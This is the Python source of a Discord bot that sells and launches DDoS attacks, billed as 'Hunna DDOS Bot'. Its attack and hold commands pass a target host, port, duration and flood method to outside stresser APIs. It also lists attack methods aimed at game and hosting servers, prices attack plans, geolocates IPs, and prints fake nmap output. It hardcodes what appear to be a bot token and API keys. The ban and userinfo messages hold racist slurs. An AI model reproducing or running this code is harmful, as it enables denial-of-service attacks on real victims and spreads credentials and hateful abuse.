import discord
from discord.ext import commands
import json, requests, datetime, tasks
import asyncio
import os
import time
import threading
import websocket


intents = discord.Intents.default()
intents.members = True
client = discord.Client(intents=intents)
client = commands.Bot(command_prefix='./')
client.remove_command('help')


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.idle, activity=discord.Game('.gg/FvJ8XN7q4Q Made by Envx'))
    print("--------------------")
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('--------------------')
@client.event
async def on_member_join(member):
    channel = client.get_channel(852256444652847165)
    await channel.send(f"Welcome to the server, {member.mention}. We now have {len(list(client.get_all_members()))} members.")
@client.command()
@commands.has_permissions(manage_messages=True)
@commands.has_any_role('Buyer')
async def attack(ctx, host, port, time, method):
    await ctx.message.delete()
    start = datetime.datetime.now()
    r = requests.get(f"https://infernoapi.com/l4?key=7d4baa5b008bb00827fb4899-85a406d6&host={host}&port={port}&time={time}&method={method}&pps=1000000&threads=10")
    embed = discord.Embed(
    colour=discord.Colour.red()
    )
    embed.set_author(name='Attack has been sent successfully')
    embed.set_footer(text='Discord bot made by Envx')
    embed.add_field(name='•Host', value=f'{host}', inline=False)
    embed.add_field(name='•Port', value=f'{port}', inline=False)
    embed.add_field(name='•Time', value=f'{time}', inline=False)
    embed.add_field(name='•Method', value=f'{method}', inline=False)
    await ctx.send(embed=embed)
    print('has sent a attack with api 1')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} sent a attack to : {host} for : {time} on port : {port} with method : {method} with api 2')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} sent a attack to : {host} for : {time} on port : {port} with method : {method} with api 2')
@client.command()
async def test(ctx):
  channel = client.get_channel(855196856782815262)
  await channel.send(f'{ctx.message.author.name} has ran a test')
  channel = client.get_channel(855194053070028842)
  await channel.send(f'{ctx.message.author.name} has ran a test')
@attack.error
async def attack_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
     await ctx.reply('**U are Missing A Required Argument**')
    if isinstance(error, commands.MissingPermissions):
     await ctx.reply('**U are not a buyer and have been logged in our data base**')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has tryed to send a attack')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has tryed to send a attack')
@client.command()
async def api1(ctx):
    await ctx.message.delete()
    await ctx.send(f'**./attack [Host] [Port] [Time] [Method]**')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command api1')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command ap1')
@client.command()
async def api2(ctx):
    await ctx.message.delete()
    await ctx.send(f'**./hold [Host] [Port] [Time] [Method]**')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command api2')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command ap2')
@client.command()
async def methods(ctx):
    await ctx.message.delete()
    embed = discord.Embed(colour=discord.Colour.red(), title='Methods', timestamp=ctx.message.created_at)
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='•Homekill', value='HOMEKILL', inline=True)
    embed.add_field(name='•Ldap', value='LDAP', inline=True)
    embed.add_field(name='•war-ready', value='WAR-READY', inline=True)
    embed.add_field(name='•chargen', value='CHARGEN', inline=True)
    embed.add_field(name='•ovh-tcp', value='OVH-TCP', inline=True)
    embed.add_field(name='•ovh-riot', value='OVH-RIOT', inline=True)
    embed.add_field(name='•ovh-c&c', value='OVH-C&C', inline=True)
    embed.add_field(name='•100up-storm', value='100UP-STOMP', inline=True)
    embed.add_field(name='•nfo-riot', value='NFO-RIOT', inline=True)
    embed.add_field(name='•nfo-tcp', value='NFO-TCP', inline=True)
    embed.add_field(name='•Killall', value='KILLALL', inline=True)
    embed.add_field(name='•tempest-drop', value='TEMPEST-DROP', inline=True)
    embed.add_field(name='•webserver-xv', value='WEBSERVER-XV', inline=True)
    embed.add_field(name='•psn-rape', value='PSN-RAPE', inline=True)
    embed.add_field(name='•hydra-drop', value='HYDRA-DROP', inline=True)
    embed.add_field(name='•port-flood', value='PORT-FLOOD', inline=True)
    embed.add_field(name='•fortnite', value='FORTNITE', inline=True)
    embed.add_field(name='•apex-drop', value='APEX-DROP', inline=True)
    embed.add_field(name='•roblox-xv', value='ROBLOX-XV', inline=True)
    embed.add_field(name='•r6', value='R6', inline=True)
    embed.add_field(name='•2k-drop', value='2K-DROP', inline=True)
    embed.add_field(name='•wra', value='WRA', inline=True)
    embed.add_field(name='•nfo-killer', value='NFO-KILLER', inline=True)
    embed.add_field(name='•inferno-game', value='INFERNO-GAME', inline=True)
    await ctx.author.send(embed=embed)
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Methods')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Methods')
@client.command()
async def home(ctx):
    await ctx.message.delete()
    embed = discord.Embed(colour=discord.Colour.red(), title='Home Holder Methods', timestamp=ctx.message.created_at)
    embed.add_field(name='•ldap', value='LDAP', inline=True)
    embed.add_field(name='•hold', value='HOLD', inline=True)
    await ctx.author.send(embed=embed)
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Home')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Home')
@client.command()
async def plans(ctx):
    embed = discord.Embed(colour=discord.Colour.red(), title='Plans', timestamp=ctx.message.created_at)
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='1 month 120s 1 con', value='10$', inline=False)
    embed.add_field(name='1 month 300s 2 con', value='15$', inline=False)
    embed.add_field(name='1 month 1500s 2 con', value='20$', inline=False)
    embed.add_field(name='3 month 120s 1 con', value='20$', inline=False)
    embed.add_field(name='3 month 300s 2 con', value='30$', inline=False)
    embed.add_field(name='3 month 1500s 2 con', value='40$', inline=False)
    embed.add_field(name='lifetime 120s 1 con', value='40$', inline=False)
    embed.add_field(name='lifetime 300s 2 con', value='60$', inline=False)
    embed.add_field(name='lifetime 1500s 2 con', value='80$', inline=False)
    await ctx.reply(embed=embed)
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Plans')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Plans')
@client.command()
async def deals(ctx):
    embed = discord.Embed(colour=discord.Colour.red(), title='Deals', timestamp=ctx.message.created_at)
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='1 Month On Both Holder And Ddos Bot | 300s | 1 con', value='20$', inline=False)
    embed.add_field(name='2 Month On Both Holder And Ddos Bot | 600s | 2 con', value='40$', inline=False)
    embed.add_field(name='2 Months On Holder | 1 Month On Ddos Bot | 800s | 1 con', value='40$', inline=False)
    embed.add_field(name='lifetime On Both Holder And Ddos Bot | 800s | 2 con', value='70$', inline=False)
    embed.add_field(name='New Deals Every week!!', value='06/21/2021', inline=False)
    await ctx.reply(embed=embed)
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Deals')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Deals')
@client.command()
async def plans2(ctx):
    embed = discord.Embed(colour=discord.Colour.red(), title='Home Holder Plans', timestamp=ctx.message.created_at)
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='1 month | 3600s | 1 con', value='10$', inline=False)
    embed.add_field(name='1 month | 7200s | 1 con', value='15$', inline=False)
    embed.add_field(name='1 month | 100000s | 1 con', value='25$', inline=False)
    embed.add_field(name='3 month | 3600s | 2 con', value='25$', inline=False)
    embed.add_field(name='3 month | 7200s | 2 con', value='30$', inline=False)
    embed.add_field(name='3 month | 100000s | 2 cons', value='40$', inline=False)
    embed.add_field(name='lifetime | 3600s | 2 con', value='50$', inline=False)
    embed.add_field(name='lifetime | 7200s | 2 con', value='60$', inline=False)
    embed.add_field(name='lifetime | 100000s | 2 con', value='80$', inline=False)
    embed.add_field(name='Godlifetime | 1209600s | 2 con | 2 weeks', value='100$', inline=False)
    await ctx.reply(embed=embed)
@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('**This command does not exist. Type ./help to see all commands**')
@client.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount : int):
    await ctx.send(f'**{amount} messages have been cleared**')
    await asyncio.sleep(3)
    await ctx.channel.purge(limit=amount)
    print (f'{amount} messages cleared')
@purge.error
async def purge_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('**Specify an amount of messages to delete**')
@client.command()
async def help(ctx):
    embed = discord.Embed(colour=discord.Color.red(), title='•Hunna DDOS Bot', timestamp=ctx.message.created_at)
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='•Attack', value='./attack', inline=True)
    embed.add_field(name='•Geo', value='./geo', inline=True)
    embed.add_field(name='•Prefix', value='./prefix', inline=True)
    embed.add_field(name='•Methods', value='./methods', inline=True)
    embed.add_field(name='•Plans', value='./plans', inline=True)
    embed.add_field(name='•Plans2', value='./plans2', inline=True)
    embed.add_field(name='•Purge', value='./purge', inline=True)
    embed.add_field(name='•Hold', value='./hold', inline=True)
    embed.add_field(name='•Home', value='./home', inline=True)
    embed.add_field(name='•Nmap', value='./nmap', inline=True)
    embed.add_field(name='•Deals', value='./deals', inline=True)
    embed.add_field(name='•Ping', value='./ping', inline=True)
    embed.add_field(name='•LockDown', value='./lockdown', inline=True)
    embed.add_field(name='•UnLock', value='./unlock', inline=True)
    embed.add_field(name='•Add', value='./add', inline=True)
    embed.add_field(name='•Multiply', value='./multiply', inline=True)
    await ctx.reply(embed=embed)
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Help')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Help')
@client.command()
async def geo(ctx, host):
    start = datetime.datetime.now()
    r = requests.get(f"http://ipwhois.app/json/{host}")
    geo = r.json()
    embed = discord.Embed(
    colour=discord.Colour.red()
    )
    embed.set_author(name='Made bye Envx')
    embed.set_footer(text='Discord bot made by Envx')
    embed.add_field(name='IP', value= geo['ip'], inline=True)
    embed.add_field(name='Type', value= geo['type'], inline=True)
    embed.add_field(name='Continent', value= geo['continent'],  inline=True)
    embed.add_field(name='Country', value= geo['country'],  inline=True)
    embed.add_field(name='Region', value= geo['region'],  inline=True)
    embed.add_field(name='City', value= geo['city'], inline=True)
    embed.add_field(name='ISP', value= geo['isp'], inline=True)
    embed.add_field(name='Org', value= geo['org'], inline=True)
    embed.add_field(name='ASN', value= geo['asn'], inline=True)
    embed.add_field(name='Timezone', value= geo['timezone_name'], inline=True)
    embed.add_field(name='Latitute', value= geo['latitude'], inline=True)
    embed.add_field(name='Longitude', value= geo['longitude'], inline=True)
    await ctx.reply(embed=embed)
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Geo')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Geo')
@geo.error
async def geo_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply('**Missing the ip address**')
@client.command()
@commands.has_permissions(manage_messages=True)
@commands.has_any_role('Holder')
async def hold(ctx, host, port, time, method):
    await ctx.message.delete()
    start = datetime.datetime.now()
    r = requests.get(f"https://homeholder.xyz/HomeHolder/api/AllAPI.php?key=Envx1m7/14/2021-534534&host={host}&time={time}&port={port}&method={method}")
    embed = discord.Embed(
    colour=discord.Colour.red()
    )
    embed.set_author(name='Attack has been sent successfully')
    embed.set_footer(text='Discord bot made by Envx')
    embed.add_field(name='•Host', value=f'{host}', inline=False)
    embed.add_field(name='•Port', value=f'{port}', inline=False)
    embed.add_field(name='•Time', value=f'{time}', inline=False)
    embed.add_field(name='•Method', value=f'{method}', inline=False)
    await ctx.send(embed=embed)
    print('has sent a attack with api 2')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} sent a attack to : {host} for : {time} on port : {port} with method : {method} with api 2')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} sent a attack to : {host} for : {time} on port : {port} with method : {method} with api 2')
@hold.error
async def hold_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
     await ctx.reply('**U are Missing A Required Argument**')
    if isinstance(error, commands.MissingPermissions):
     await ctx.reply('**U are not a buyer and have been logged in our data base**')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has tryed to send a attack')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has tryed to send a attack')
@client.command()
@commands.has_permissions(manage_messages=True)
async def nmap(ctx, host):
    await ctx.message.delete()
    start = datetime.datetime.now()
    r = requests.get(f"https://api.hackertarget.com/nmap/?q={host}")
    await ctx.send(f'Nmap scan report for ({host})')
    await ctx.send('Host is up (0.0013s latency).')
    await ctx.send('PORT     STATE    SERVICE')
    await ctx.send('21/tcp   filtered ftp')
    await ctx.send('22/tcp   filtered ssh')
    await ctx.send('80/tcp   open     http')
    await ctx.send('110/tcp  filtered pop3')
    await ctx.send('143/tcp  filtered imap')
    await ctx.send('443/tcp  open     https')
    await ctx.send('3389/tcp filtered ms-wbt-server')
    await ctx.send('Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{ctx.message.author.name} has used the command Nmap')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} has used the command Nmap')
@nmap.error
async def nmap_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply('**Missing the ip address**')
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply('**U are not a buyer**')
@client.command()
async def rezzoiscute(ctx):
    await ctx.message.delete()
    embed = discord.Embed(colour=discord.Color.red(), title='•Secret Command')
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='U have one the secret command!! | Send the command used to :', value='! Envx !#0696 | For 15% percent off any Plan!!', inline=False)
    await ctx.member.send(embed=embed)
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} Has Got The Secret Command')
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{ctx.message.author.name} Has Got The Secret Command')
@client.command()
async def inv(ctx):
  await ctx.reply('https://discord.gg/CgUD22C6ce')
@client.command()
async def userinfo(ctx, user: discord.User = None):

    if user is None:
        await ctx.send('**@ a user u fucking idiot**')
        return

    embed = discord.Embed(timestamp=ctx.message.created_at, description = f'Here is info about this nigga {user.name}', colour = discord.Colour.red())

    embed.add_field(name = user, value = f' - User\'s name: {user}\n- User\'s ID: {user.id}\n- User\'s discrim: {user.discriminator}\n- User\'s is a bot: {user.bot}\n- User\'s Display Name: {user.display_name}\n- User\'s Top Role: {user.top_role.mention}')
    embed.set_footer(text=f"Discord bot made by Envx")
    await ctx.reply(embed=embed)
    channel = client.get_channel(855196856782815262)
    await channel.send(f'{user} has used the command userinfo')
    channel = client.get_channel(855194053070028842)
    await channel.send(f'{user} has used the command userinfo')
@client.command(aliases=['ms'])
async def ping(ctx):
    em = discord.Embed(title="Ping", description=f"The bot's ping is currently `{round(client.latency * 1000)}ms`", color=discord.Colour.red())
    await ctx.send(embed=em)
    print('Ping/ms command has executed')
@client.command()
async def serverinfo(ctx):
    embed = discord.Embed(colour=discord.Color.red(), title='•Hunna Server Info', timestamp=ctx.message.created_at)
    embed.set_footer(text='Discord Bot made by Envx')
    embed.add_field(name='Server Created At', value=f'{ctx.guild.created_at}', inline=False)
    embed.add_field(name='Server Owner', value=f'{ctx.guild.owner}', inline=False)
    embed.add_field(name='Server Region', value=f'{ctx.guild.region}', inline=False)
    embed.add_field(name='Server ID', value=f'{ctx.guild.id}', inline=False)
    await ctx.reply(embed=embed)
@client.command()
@commands.has_permissions(manage_messages=True)
async def lockdown(ctx):
  await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
  await ctx.send( ctx.channel.mention + ' **is now in lockdown**')
@client.command()
@commands.has_permissions(manage_messages=True)
async def unlock(ctx):
  await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
  await ctx.send( ctx.channel.mention + ' **has been unlocked**')
@lockdown.error
async def lockdown_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply('**U Do Not Have Permission To Use This Command**')
@unlock.error
async def unlock_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply('**U Do Not Have Permission To Use This Command**')
@purge.error
async def purge_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.reply('**U Do Not Have Permission To Use This Command**')
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.reply('**Missing The Amount of Messages To Be Deleted**')
@client.event
async def on_message_delete(message):
  client.sniped_messages[message.guild.id] = (message.content, message.author, message.channel.name, message.created_at)
@client.command()
async def add(ctx, a: int, b: int):
    """Adds 2 numbers together."""
    await ctx.send(a+b)
@client.command()
async def multiply(ctx, a: int, b: int):
    """Multiplies 2 numbers."""
    await ctx.send(a*b)
@client.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await member.send(f'You Where Kicked Cause {reason}')
    await ctx.send(f'{member.mention} was kicked for {reason}')
    print(f'{member.mention} was kicked')
@client.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await member.send(f'You were banned cause ur black and cause {reason}')
    await ctx.send(f'{member.mention} was banned for {reason}')
    print(f'{member} was banned')

@client.command()
@commands.has_permissions(administrator=True)
async def sdf(ctx):
  await ctx.message.delete()




client.run('ODUzODY4OTQxOTM5NTcyNzc3.YMbpaw.1E4P9ULRVU_VRjQzrVFMy1r0sTY')